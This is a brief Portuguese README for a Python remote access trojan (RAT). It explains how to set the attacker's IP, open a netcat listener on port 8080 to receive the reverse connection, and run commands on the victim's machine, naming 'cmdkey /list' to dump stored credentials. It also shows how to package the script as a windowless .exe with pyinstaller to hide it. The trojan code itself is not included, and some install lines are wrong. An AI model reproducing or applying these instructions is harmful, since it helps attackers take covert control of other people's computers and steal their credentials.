# RAT (Remote Acess Trojan) In Python

**Como Usar:**
Você irá precisar do seu ip e renomear o ip com ele

vc precisará do netcat para ligar a porta 8080(padrão do projeto) usando 'nc -lvb 8080'

Você pode executar comandos como cmdkey /list (lista credenciais no dispositivo),calc(abre calculadora) e etc

**Requisitos**
Python 3.10+ 
pip install time
pip install subprocess

para tranformar em .exe use: pyinstaller --onefile --noconsole rat.py

**By Marco**
